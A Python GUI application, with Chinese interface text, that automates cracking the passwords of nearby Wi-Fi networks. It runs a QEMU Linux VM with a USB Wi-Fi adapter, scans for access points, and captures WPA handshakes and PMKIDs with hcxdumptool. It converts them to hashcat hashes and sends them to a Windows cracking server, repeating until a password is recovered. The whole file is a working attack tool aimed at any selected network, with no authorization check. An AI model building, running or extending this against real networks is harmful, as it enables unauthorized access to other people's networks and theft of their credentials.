#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mac_wifi_app_v2.py — 一選就跑
================================
選一台 Wi-Fi → 自動循環：抓包 → 轉 hash → 送 Windows → 即時顯示破解狀態
出密碼就停；沒出就一直換角度抓、重送，直到你按「停止」。

底層沿用 mac_capture_app：QEMU Alpine + DWA-160 USB + hcxdumptool + hcxpcapngtool
"""
import tkinter as tk
from tkinter import ttk
import subprocess, threading, time, json, re, os, urllib.request

# ---------------- fixed paths (Mac side) ----------------
QEMU_BIN = '/opt/homebrew/bin/qemu-system-aarch64'
_HOMEV = os.path.expanduser('~/vmbuild')
def _pick(*cands):
    for p in cands:
        if os.path.exists(p):
            return p
    return cands[0]
QCOW2   = _pick(_HOMEV + '/alpine-root.qcow2', '/tmp/alpine-root.qcow2')
KERNEL  = _pick('/tmp/alpine-boot/boot/vmlinuz-lts', _HOMEV + '/alpine-boot/boot/vmlinuz-lts')
INITRD  = _pick(_HOMEV + '/vmbuild/runner-initrd', '/tmp/vmbuild/runner-initrd',
                '/tmp/initramfs-custom', _HOMEV + '/initramfs-custom')
RUNNER_MODE = 'runner' in os.path.basename(INITRD)
CH = 'chroot /newroot ' if RUNNER_MODE else ''
SERIAL_LOG = '/tmp/vm_app_serial.log'
MON_SOCK   = '/tmp/vm_app_monitor.sock'
SSH_KEY    = os.path.expanduser('~/.ssh/vm_tongbao')
VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)
BIND = ('mount --bind /proc /newroot/proc 2>/dev/null; '
        'mount --bind /sys /newroot/sys 2>/dev/null; '
        'mount --bind /dev /newroot/dev 2>/dev/null\n') if RUNNER_MODE else ''

LOCAL_DIR = os.path.expanduser('~/MacCapture/captures')
DEFAULT_WIP, DEFAULT_PORT, DEFAULT_DUR = '192.168.1.107', '8766', '45'

# ---------------- dark theme ----------------
C_BG      = '#12151c'   # window
C_PANEL   = '#1a1e28'   # panels
C_CARD    = '#20263a'   # cards / tree rows
C_CARD_HI = '#2c3454'   # selected row
C_TEXT    = '#e8ecf4'
C_DIM     = '#8b93a7'
C_ACC     = '#3b82f6'   # blue
C_GREEN   = '#22c55e'
C_RED     = '#ef4444'
C_AMBER   = '#f59e0b'
FONT      = ('-apple-system', 12)
FONT_B    = ('-apple-system', 12, 'bold')
FONT_H    = ('-apple-system', 18, 'bold')
FONT_MONO = ('Menlo', 11)
FONT_PASS = ('Menlo', 20, 'bold')

class App:
    def __init__(self, root):
        self.root = root
        root.title('WiFi 破解台  ·  選一台 → 自動跑')
        root.geometry('1060x720')
        root.minsize(900, 620)
        root.configure(bg=C_BG)

        self.var = {
            'wip':  tk.StringVar(value=DEFAULT_WIP),
            'port': tk.StringVar(value=DEFAULT_PORT),
            'dur':  tk.StringVar(value=DEFAULT_DUR),
        }
        self._stop  = threading.Event()
        self._running = threading.Event()
        self.aps = []          # [(ssid, bssid, ch, sig)]
        self.target = None     # (ssid, bssid, ch)
        self.hash_pool = set() # hashes for current target
        self.phase = ('idle', '等待選定 Wi-Fi')

        self._build()
        threading.Thread(target=self._usb_vm_loop, daemon=True).start()
        threading.Thread(target=self._scan_loop, daemon=True).start()
        self._log('就緒。自動掃描中 — 在左邊選一台 Wi-Fi 就會自動開始。')
        self._startup_vm()

    # ================= UI =================
    def _build(self):
        top = ttk.Frame(self.root)
        st = ttk.Style()
        st.theme_use('clam')
        st.configure('.', background=C_BG)
        top.pack(fill='x', padx=14, pady=(12, 6))
        ttk.Label(top, text='WiFi 破解台', font=FONT_H, foreground=C_TEXT,
                  background=C_BG).pack(side='left')
        self.lbl_wip = ttk.Label(top, text='', font=FONT, foreground=C_DIM,
                                 background=C_BG)
        self.lbl_wip.pack(side='left', padx=16)
        # status cards: USB 網卡 + VM 介面
        self.card_usb = tk.Label(top, text='🔌 DWA-160 網卡：檢查中…', font=FONT_B,
                                 bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                 anchor='w', relief='flat')
        self.card_usb.pack(side='left', padx=(14, 4))
        self.card_vm = tk.Label(top, text='📶 VM wlan0：檢查中…', font=FONT_B,
                                bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                anchor='w', relief='flat')
        self.card_vm.pack(side='left', padx=4)
        ttk.Label(top, text='Windows', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['wip'], width=14,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        ttk.Label(top, text='port', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['port'], width=6,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        ttk.Label(top, text='抓包秒數', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['dur'], width=4,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        self.btn_stop = tk.Button(top, text='■ 停止', command=self.stop_all,
                                  font=FONT_B, fg=C_TEXT, bg='#3a2530',
                                  activebackground='#553040', relief='flat',
                                  padx=14, pady=4)
        self.btn_stop.pack(side='left')

        body = ttk.Frame(self.root)
        body.pack(fill='both', expand=True, padx=14, pady=6)
        body.columnconfigure(1, weight=2)
        body.columnconfigure(2, weight=2)
        body.rowconfigure(0, weight=1)

        # ---- left: network list ----
        left = tk.Frame(body, bg=C_PANEL)
        left.grid(row=0, column=0, sticky='nsew', padx=(0, 10))
        lf = tk.Frame(left, bg=C_PANEL)
        lf.pack(fill='x', padx=10, pady=(10, 4))
        self.lbl_scan = tk.Label(lf, text='📡 掃描中…', bg=C_PANEL, fg=C_DIM,
                                 font=FONT_B)
        self.lbl_scan.pack(side='left')
        tk.Button(lf, text='重新掃描', command=self._scan_now, bg=C_CARD,
                  fg=C_TEXT, relief='flat', padx=10, font=FONT,
                  activebackground=C_CARD_HI).pack(side='right')
        self.tree = ttk.Treeview(left, columns=('ssid', 'ch', 'sig'),
                                 show='headings', selectmode='browse')
        self.tree.heading('ssid', text='SSID')
        self.tree.heading('ch', text='Ch')
        self.tree.heading('sig', text='訊號')
        self.tree.column('ssid', anchor='w', stretch=True)
        self.tree.column('ch', width=42, anchor='center', stretch=False)
        self.tree.column('sig', width=52, anchor='center', stretch=False)
        st.configure('Dark.Treeview', background=C_CARD, fieldbackground=C_CARD,
             foreground=C_TEXT, rowheight=30, font=FONT)
        st.configure('Dark.Treeview.Heading', background=C_PANEL,
                     foreground=C_DIM, font=FONT_B)
        st.map('Dark.Treeview',
               background=[('selected', C_CARD_HI)],
               foreground=[('selected', C_TEXT)])
        self.tree.configure(style='Dark.Treeview')
        self.tree.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        self.tree.bind('<Button-1>', self._on_pick)
        self.tree.bind('<Double-1>', self._on_pick)
        self._hint = tk.Label(left, text='← 選一台自動開始（選定後掃描暫停）',
                              bg=C_PANEL, fg=C_DIM, font=FONT)
        self._hint.pack(pady=(0, 8))

        # ---- middle: status ----
        mid = tk.Frame(body, bg=C_PANEL)
        mid.grid(row=0, column=1, sticky='nsew')
        # target card
        tc = tk.Frame(mid, bg=C_CARD)
        tc.pack(fill='x', padx=10, pady=(10, 6), ipadx=14, ipady=12)
        self.lbl_target = tk.Label(tc, text='尚未選定', font=FONT_H,
                                   bg=C_CARD, fg=C_TEXT)
        self.lbl_target.pack(anchor='w')
        self.lbl_target_sub = tk.Label(tc, text='—', font=FONT,
                                       bg=C_CARD, fg=C_DIM)
        self.lbl_target_sub.pack(anchor='w', pady=(2, 0))
        # phase list
        self.phases = {}
        for key, name in [('scan', '1 · 選定'), ('cap', '2 · 抓包'),
                          ('conv', '3 · 轉 hash + 送 Windows'),
                          ('crack', '4 · Windows 破解中')]:
            row = tk.Frame(mid, bg=C_PANEL)
            row.pack(fill='x', padx=10, pady=2)
            self.phases[key] = tk.Label(row, text='○  ' + name, font=FONT_B,
                                        bg=C_PANEL, fg=C_DIM, anchor='w')
            self.phases[key].pack(fill='x')
            self.phases[key + '_sub'] = tk.Label(mid, text='', font=FONT_MONO,
                                                 bg=C_PANEL, fg=C_DIM,
                                                 anchor='w')
            self.phases[key + '_sub'].pack(fill='x', padx=24)
        # result card
        rc = tk.Frame(mid, bg=C_CARD)
        rc.pack(fill='x', padx=10, pady=8)
        self.lbl_result = tk.Label(rc, text='—', font=FONT_PASS, bg=C_CARD,
                                   fg=C_DIM, anchor='center')
        self.lbl_result.pack(padx=14, ipadx=14, ipady=18)

        # ---- right: log ----
        right = tk.Frame(body, bg=C_PANEL)
        right.grid(row=0, column=2, sticky='nsew', padx=(10, 0))
        tk.Label(right, text='狀態流水', font=FONT_B, bg=C_PANEL,
                 fg=C_DIM).pack(anchor='w', padx=10, pady=(10, 2))
        self.log = tk.Text(right, bg='#101420', fg=C_TEXT, font=FONT_MONO,
                           relief='flat', state='disabled', wrap='word',
                           insertbackground=C_TEXT)
        self.log.pack(fill='both', expand=True, padx=10, pady=(0, 10),
                      ipadx=8, ipady=6)

    def _set_phases(self):
        order = ['scan', 'cap', 'conv', 'crack']
        cur = self.phase[0]
        for k in order:
            if k == 'idle':
                continue
            is_cur = (cur == k)
            if is_cur:
                txt, col = '●  ' + self.phase[1], C_ACC
            else:
                txt, col = '○  ' + self._phase_name(k), C_DIM
            self._ui(lambda: self.phases[k].config(text=txt, fg=col))

    def _phase_name(self, k):
        return {'scan': '選定', 'cap': '抓包', 'conv': '轉 hash + 送 Windows',
                'crack': 'Windows 破解中'}.get(k, k)

    def set_phase(self, key, text, sub=''):
        self.phase = (key, text)
        if hasattr(self, 'phases'):
            self._ui(lambda: self.phases.get(key, tk.Label()).config(fg=C_ACC))
        if sub:
            self._ui(lambda: self.phases[key + '_sub'].config(text=sub))
        self._log('[%s] %s' % (self._phase_name(key), sub or text))

    def _result(self, text, color):
        self._ui(lambda: self.lbl_result.config(text=text, fg=color))

    # ================= UI thread helpers =================
    def _ui(self, fn):
        try:
            self.root.after(0, fn)
        except Exception:
            pass

    def _log(self, msg):
        def _do():
            self.log.config(state='normal')
            self.log.insert('end', time.strftime('%H:%M:%S ') + msg + '\n')
            self.log.see('end')
            self.log.config(state='disabled')
        self._ui(_do)

    # ================= USB / VM =================
    def _usb_vm_loop(self):
        while not self._stop.is_set():
            usb = self._check_usb()
            vm = self.vm_ready(timeout=8) if usb else False
            if usb and vm:
                tu, cu = '🔌 DWA-160 網卡：✅ 已連線', C_GREEN
                tv, cv = '📶 VM wlan0：✅ 就緒', C_GREEN
            elif usb:
                tu, cu = '🔌 DWA-160 網卡：✅ 已連線', C_GREEN
                tv, cv = '📶 VM wlan0：⏳ 啟動中…', C_AMBER
            else:
                tu, cu = '🔌 DWA-160 網卡：❌ 未偵測到（請插入）', C_RED
                tv, cv = '📶 VM wlan0：—', C_DIM
            self._ui(lambda: self.card_usb.config(text=tu, fg=cu))
            self._ui(lambda: self.card_vm.config(text=tv, fg=cv))
            for _ in range(5):
                if self._stop.is_set():
                    return
                time.sleep(1)

    def _check_usb(self):
        try:
            r = subprocess.run('ioreg -r -c IOUSBHostDevice', shell=True,
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            if ('idVendor" = 5263' in out) and ('idProduct" = 21874' in out):
                return True
        except Exception:
            pass
        try:
            r = subprocess.run('system_profiler SPUSBDataType', shell=True,
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace').lower()
            return ('148f' in out) and ('5572' in out)
        except Exception:
            return False

    def vm_ready(self, timeout=25):
        try:
            r = subprocess.run(
                VM_SSH + ' "%s/usr/sbin/iw dev 2>/dev/null"' % CH,
                shell=True, capture_output=True, timeout=timeout)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            return 'wlan0' in out
        except Exception:
            return False

    def _startup_vm(self):
        if self.vm_ready(timeout=10):
            self._log('✅ VM 已就緒（沿用）')
            return
        self._log('⏳ 啟動 VM（QEMU + DWA-160）...')
        missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY)
                   if not os.path.exists(f)]
        if missing:
            self._log('❌ 缺少: %s' % ', '.join(missing))
            return
        try:
            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
        except Exception:
            pass
        time.sleep(2)
        os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
        cmd = ('%s -machine virt -cpu cortex-a72 -m 2048 -smp 4 '
               '-drive file=%s,format=qcow2 '
               '-kernel %s -initrd %s -append "console=ttyAMA0" '
               '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
               '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
               '-device virtio-net-pci,netdev=n0 '
               '-device qemu-xhci,id=xhci '
               '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
               '-display none -monitor unix:%s,server,nowait'
               % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        for _ in range(50):
            if self._stop.is_set():
                return
            if self.vm_ready(timeout=8):
                self._log('✅ VM 就緒')
                return
            time.sleep(3)
        self._log('⚠️ VM 逾時（繼續，之後每輪重試）')

    def boot_vm_if_needed(self):
        if self.vm_ready(timeout=12):
            return True
        self._log('VM 不在 → 重啟 ...')
        self._startup_vm()
        return self.vm_ready(timeout=12)

    # ================= scan =================
    def _scan_loop(self):
        while not self._stop.is_set():
            if self._running.is_set():
                time.sleep(3)
                continue
            self._scan_now()
            for _ in range(6):
                if self._stop.is_set():
                    return
                time.sleep(1)

    def _scan_now(self):
        if not self.vm_ready(timeout=8):
            self._ui(lambda: self.lbl_scan.config(text='⏳ VM 未就緒', fg=C_AMBER))
            return
        script = (BIND +
                  CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\nsleep 1\n' +
                  'for ch in 1 6 11 36; do\n' +
                  CH + '  /usr/sbin/iw dev wlan0 set channel $ch 2>/dev/null\n' +
                  CH + '  rm -f /tmp/bc_$ch.pcap\n' +
                  CH + '  timeout 6 /usr/bin/tcpdump -i wlan0 -s 160 -w /tmp/bc_$ch.pcap 2>/dev/null\n' +
                  '  echo "MARK:$ch"\n' +
                  CH + '  /usr/bin/tcpdump -r /tmp/bc_$ch.pcap -e -n 2>/dev/null\n' +
                  'done\n')
        try:
            r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
                               capture_output=True, timeout=90, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            aps = self._parse_scan(out)
            with open('/tmp/mac_wifi_scan.txt', 'w') as f:
                f.write(time.strftime('%H:%M:%S') + ' APs=' + str(len(aps)) + '\n')
                for a in aps[:20]:
                    f.write('  ' + str(a[0]) + ' ' + str(a[1]) + ' ch' + str(a[2]) + ' ' + str(a[3]) + '\n')
            self.aps = aps
            self._refresh_tree()
            self._ui(lambda: self.lbl_scan.config(
                text='📡 %s · %d AP' % (time.strftime('%H:%M:%S'), len(aps)),
                fg=C_GREEN if aps else C_AMBER))
        except Exception as e:
            self._ui(lambda: self.lbl_scan.config(text='⚠️ scan 失敗', fg=C_RED))

    @staticmethod
    def _parse_scan(out):
        aps = {}
        order = []
        ch = 0
        for raw in out.splitlines():
            ls = raw.strip()
            mk = re.match(r'MARK:(\d+)', ls)
            if mk:
                ch = int(mk.group(1))
                continue
            if 'DA:ff:ff:ff:ff:ff:ff' not in ls or 'Beacon (' not in ls:
                continue
            mb = re.search(r'BSSID:([0-9a-f]{2}(?::[0-9a-f]{2}){5})', ls)
            if not mb:
                continue
            bssid = mb.group(1).replace(':', '').lower()
            ms = re.search(r'Beacon \(([^)]*)\)', ls)
            ssid = ms.group(1).strip() if ms else ''
            if bssid not in aps:
                aps[bssid] = {'ssid': ssid, 'ch': ch}
                order.append(bssid)
            elif ssid and not aps[bssid]['ssid']:
                aps[bssid]['ssid'] = ssid
        res = []
        for b in order:
            a = aps[b]
            res.append((a['ssid'] or '(hidden)', b.upper(), str(a['ch']), ''))
        try:
            res.sort(key=lambda x: int(x[2]) if x[2].isdigit() else 99)
        except Exception:
            pass
        return res


    def _refresh_tree(self):
        def _do():
            self.tree.delete(*self.tree.get_children())
            for ssid, bssid, ch, sig in self.aps:
                self.tree.insert('', 'end', values=(ssid, ch, sig))
            if self.target:
                for i, (ssid, bssid, ch, sig) in enumerate(self.aps):
                    if bssid == self.target[1]:
                        self.tree.selection_set(self.tree.get_children()[i])
                        break
        self._ui(_do)

    def _on_pick(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        idx = list(self.tree.get_children()).index(sel[0])
        if idx >= len(self.aps):
            return
        ssid, bssid, ch, sig = self.aps[idx]
        self.target = (ssid, bssid, ch)
        self._ui(lambda: self.lbl_target.config(
            text='%s' % ssid, fg=C_TEXT))
        self._ui(lambda: self.lbl_target_sub.config(
            text='%s · ch%s · %s' % (bssid, ch, sig or '?')))
        self._result('選定 %s — 自動開始…' % ssid, C_ACC)
        self._log('🎯 選定: %s (%s ch%s) → 自動開始' % (ssid, bssid, ch))
        if not self._running.is_set():
            threading.Thread(target=self._auto_loop,
                             args=(ssid, bssid, ch), daemon=True).start()

    def stop_all(self):
        self._stop.set()
        threading.Thread(target=lambda: (self._stop.wait(0),
                                         subprocess.run(['pkill', '-f',
                                                         'qemu-system-aarch64'],
                                                        capture_output=True)),
                         daemon=True).start()
        self._stop = threading.Event()
        self._running.clear()
        self.phase = ('idle', '已停止')
        self.hash_pool = set()
        self._result('已停止', C_DIM)
        self._log('■ 已停止')

    # ================= capture + post + wait =================
    def _auto_loop(self, ssid, bssid, ch):
        self._running.set()
        self.hash_pool = set()
        wip = self.var['wip'].get().strip()
        port = self.var['port'].get().strip()
        dur = int(self.var['dur'].get().strip() or '45')
        rnd = 0
        self.set_phase('scan', '已選定', '%s ch%s' % (bssid, ch))
        try:
            while not self._stop.is_set():
                rnd += 1
                self._running.set()
                try:
                    self._round(rnd, ssid, bssid, ch, wip, port, dur)
                except Exception as e:
                    self._log('⚠️ 第 %d 輪錯誤: %r' % (rnd, e))
                if self.phase[0] == 'done':
                    break
        finally:
            self._running.clear()

    def _round(self, rnd, ssid, bssid, ch, wip, port, dur):
        if not self.boot_vm_if_needed():
            self.set_phase('cap', 'VM 未就緒，等待...', '重試中')
            time.sleep(15)
            return
        # ---- 2. capture ----
        self.hash_pool.clear()
        self.set_phase('cap', '第 %d 輪抓包 (%ds)' % (rnd, dur),
                       'hcxdumptool %s ch%s' % (bssid, ch))
        script = (BIND +
CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\nsleep 3\n' +
                  'timeout %d ' % dur +
                  CH + 'hcxdumptool -i wlan0 -w /tmp/scan_%d ' % rnd +
                  '-F -t 7 --rds=2 2>&1 | tail -15\n' +
                  'echo "===CONVERT==="\n' +
                  CH + 'hcxpcapngtool -o /tmp/scan_%d.22000 /tmp/scan_%d '
                       '2>&1 | tail -4\n' % (rnd, rnd) +
                  'echo "===HASH==="\n' +
                  'cat ' + CH + '/tmp/scan_%d.22000 2>/dev/null\n' % rnd +
                  'echo "===END==="\n')
        r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
                           capture_output=True, timeout=dur + 150, shell=True)
        out = (r.stdout or b'').decode('utf-8', 'replace') + \
              (r.stderr or b'').decode('utf-8', 'replace')
        lines = out.splitlines()
        hash_lines, in_hash = [], False
        for line in lines:
            if '===HASH===' in line:
                in_hash = True
                continue
            if '===END===' in line:
                in_hash = False
                continue
            if in_hash and line.strip():
                hash_lines.append(line.strip())
        self.hash_pool.update(hash_lines)
        self._save_local(ssid, sorted(self.hash_pool))
        self.set_phase('conv', '本輪 %d hash（累計 %d）' % (len(hash_lines),
                        len(self.hash_pool)),
                       '只送 %s 相關的 %d 行' % (ssid, len(self._target_lines())))
        if not self._target_lines():
            self._log('   本輪沒有 %s 的 hash — 再抓一輪' % ssid)
            time.sleep(3)
            return
        # ---- 3. post ----
        posted = self._post(self._target_lines(), ssid, bssid, wip, port)
        if not posted:
            self._log('⚠️ POST 失敗（Windows 沒開？）— 30s 後重試')
            self._result('等 Windows (%s:%s)' % (wip, port), C_AMBER)
            for _ in range(30):
                if self._stop.is_set():
                    return
                time.sleep(1)
            return
        # ---- 4. wait Windows ----
        self.set_phase('crack', 'Windows 破解中...', 'watching %s:%s' % (wip, port))
        self._result('破解中…', C_AMBER)
        result = self._wait_result(wip, port, timeout=900)
        if result:
            self.set_phase('done', '🎉 破解成功', result)
            self._result('🎉  %s' % result, C_GREEN)
            self._log('🎉🎉 密碼: %s  (%s)' % (result, ssid))
        else:
            self._result('未出結果 — 下一輪', C_DIM)
            self._log('   本輪無密碼，繼續...')

    def _target_lines(self):
        b = self.target[1].lower() if self.target else ''
        out = []
        for h in self.hash_pool:
            if b and b in h.lower():
                out.append(h)
            elif h.startswith('WPA*01'):
                f = h.split('*')
                if len(f) >= 4 and f[2] == b:
                    out.append(h)
        return out

    def _save_local(self, ssid, lines):
        try:
            os.makedirs(LOCAL_DIR, exist_ok=True)
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
            path = os.path.join(LOCAL_DIR, '%s_%s.22000' % (safe,
                                        time.strftime('%Y-%m-%d')))
            seen = set()
            if os.path.exists(path):
                seen = set(l.strip() for l in open(path) if l.strip())
            new = [l for l in lines if l not in seen]
            if new:
                with open(path, 'a') as f:
                    for l in new:
                        f.write(l + '\n')
        except Exception as e:
            self._log('⚠️ 存本機: %r' % e)

    def _post(self, hashes, ssid, bssid, wip, port):
        payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
                              'bssid': bssid.lower()}).encode()
        try:
            req = urllib.request.Request(
                'http://%s:%s/api/receive-hash' % (wip, port),
                data=payload, headers={'Content-Type': 'application/json'},
                method='POST')
            body = urllib.request.urlopen(req, timeout=20).read().decode(
                'utf-8', 'replace')
            self._log('   POST OK: %s' % body[:140])
            try:
                d = json.loads(body)
                if d.get('password'):
                    self._log('   ✅ potfile 秒回: %s' % d['password'])
            except Exception:
                pass
            return True
        except Exception as e:
            self._log('   POST FAIL: %s' % e)
            return False

    def _wait_result(self, wip, port, timeout=900):
        start = time.time()
        last = ''
        while time.time() - start < timeout:
            if self._stop.is_set():
                return None
            try:
                resp = urllib.request.urlopen(
                    urllib.request.Request('http://%s:%s/api/state' % (wip, port)),
                    timeout=10)
                d = json.loads(resp.read().decode())
                status = d.get('status', '')
                msg = d.get('message', '')
                if msg and msg != last:
                    last = msg
                    self._log('   Windows: %s' % msg)
                    self._ui(lambda m=msg: self.phases['crack_sub'].config(text=m))
                if status in ('done', 'cracked', 'idle'):
                    for r in d.get('results', []):
                        if r and r != 'No match':
                            return r
                    if status != 'cracking':
                        # check message for potfile instant answer
                        if 'Found in potfile' in d.get('message', ''):
                            m = re.search(r'Found in potfile:\s*(\S+)',
                                          d.get('message', ''))
                            if m:
                                return m.group(1)
                        if status in ('done', 'idle'):
                            time.sleep(2)
                            return None
            except Exception:
                self._log('   ⚠️ 連不到 Windows')
                self._result('Windows 離線', C_RED)
            time.sleep(4)
        self._log('   ⚠️ 等待逾時 (%ds)' % timeout)
        return None

    def close(self):
        self._stop.set()
        try:
            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
        except Exception:
            pass
        self.root.destroy()


def _kill_other_instances():
    try:
        me = os.getpid()
        r = subprocess.run(['ps', '-axo', 'pid=,command='], capture_output=True, timeout=10)
        for ln in (r.stdout or b'').decode('utf-8', 'replace').splitlines():
            if 'mac_wifi_app_v2.py' not in ln:
                continue
            try:
                p = int(ln.strip().split()[0])
            except Exception:
                continue
            if p != me:
                try:
                    os.kill(p, 9)
                except Exception:
                    pass
    except Exception:
        pass

def main():
    _kill_other_instances()
    root = tk.Tk()
    app = App(root)
    root.protocol('WM_DELETE_WINDOW', app.close)
    root.mainloop()

if __name__ == '__main__':
    main()